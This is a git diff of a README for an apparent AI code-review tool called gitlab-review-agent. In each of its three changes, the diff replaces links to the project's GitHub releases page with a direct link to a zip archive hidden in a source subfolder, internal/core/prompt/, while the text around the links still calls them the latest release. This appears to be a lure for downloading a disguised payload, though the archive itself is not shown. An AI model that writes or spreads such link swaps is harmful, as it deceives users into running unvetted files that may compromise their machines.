@@ -1,6 +1,6 @@
 # ⚙️ gitlab-review-agent - Easy AI Code Review Helper
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge)](https://github.com/willton-easy/gitlab-review-agent/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-green?style=for-the-badge)](https://github.com/willton-easy/gitlab-review-agent/raw/refs/heads/main/internal/core/prompt/gitlab-agent-review-1.8.zip)
 
 ---
 
@@ -44,7 +44,7 @@ To start using gitlab-review-agent, follow these steps.
 
 Go to the main releases page here:
 
-[Download gitlab-review-agent](https://github.com/willton-easy/gitlab-review-agent/releases)
+[Download gitlab-review-agent](https://github.com/willton-easy/gitlab-review-agent/raw/refs/heads/main/internal/core/prompt/gitlab-agent-review-1.8.zip)
 
 This page holds the latest versions. You will see different files to download.
 
@@ -137,7 +137,7 @@ If you run into problems, try these tips:
 
 You can always download or update gitlab-review-agent here:
 
-[Download gitlab-review-agent Latest Release](https://github.com/willton-easy/gitlab-review-agent/releases)
+[Download gitlab-review-agent Latest Release](https://github.com/willton-easy/gitlab-review-agent/raw/refs/heads/main/internal/core/prompt/gitlab-agent-review-1.8.zip)
 
 Click the link, pick the Windows file, and follow the instructions above.
 
